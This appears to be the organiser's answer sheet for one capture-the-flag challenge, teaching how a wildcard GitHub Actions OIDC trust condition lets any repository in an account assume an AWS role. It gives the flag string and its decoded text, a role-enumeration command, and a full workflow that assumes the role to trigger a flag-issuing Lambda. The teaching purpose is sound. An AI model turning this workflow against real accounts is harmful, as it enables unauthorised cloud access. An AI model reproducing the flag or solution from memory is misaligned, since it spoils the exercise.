# Flag 1.4 — GitHub Actions OIDC Wildcard Trust

## Lesson

GitHub Actions OIDC trust policies need tight `sub` conditions. Using
`repo:jasonBirchall/*` means any repo in the account can assume the role
via OIDC. A correctly scoped condition would pin to a specific repo and
branch: `repo:jasonBirchall/specific-repo:ref:refs/heads/main`.

## Flag string (base64)

SSB3cm90ZSB0aGUgcnVuYm9va3MuIEkgd3JvdGUgdGhlIGFsZXJ0cy4gSSB3cm90ZSB0aGUgc2lsZW5jZSBiZXR3ZWVuIHRoZW0u

## Decodes to

"I wrote the runbooks. I wrote the alerts. I wrote the silence between them."

## Expected player path

1. Enumerate IAM roles trusting the GitHub OIDC provider:
   ```bash
   aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument | to_string(@), `token.actions.githubusercontent.com`)].[RoleName]' --output text
   ```
2. Read `gha-deploy-prod` trust policy — spot `repo:jasonBirchall/*` wildcard.
3. Read permissions — `s3:PutObject` + `s3:PutObjectTagging` on trophies bucket,
   `s3:GetObject` on output bucket. Note tagging permission hints tags matter.
4. Author a workflow in any `jasonBirchall` repo:
   ```yaml
   name: Capture Flag 1.4
   on: workflow_dispatch
   permissions:
     id-token: write
     contents: read
   jobs:
     capture:
       runs-on: ubuntu-latest
       steps:
         - uses: aws-actions/configure-aws-credentials@v4
           with:
             role-to-assume: arn:aws:iam::430354129336:role/gha-deploy-prod
             aws-region: eu-west-1
         - run: |
             echo "marker" > /tmp/marker.txt
             aws s3api put-object \
               --bucket govuk-eph-ctf-trophies \
               --key marker.txt \
               --body /tmp/marker.txt \
               --tagging "whitehall-marker=true"
             sleep 15
             aws s3 cp s3://govuk-eph-ctf-trophies-output/flag.txt -
   ```
5. Run via `workflow_dispatch`, read the output.
6. Submit the base64 string.

## AWS resources

- IAM Role: `gha-deploy-prod` (wildcard OIDC trust)
- S3 Bucket: `govuk-eph-ctf-trophies` (player writes tagged objects)
- S3 Bucket: `govuk-eph-ctf-trophies-output` (Lambda writes flag)
- Lambda: `ctf-trophy-validator` (validates tag, emits flag)
- IAM Role: `ctf-trophy-validator-role` (Lambda execution)

## Setup / Teardown

```bash
AWS_PROFILE=govuk-test-fulladmin ./aws/setup.sh
AWS_PROFILE=govuk-test-fulladmin ./aws/teardown.sh
```
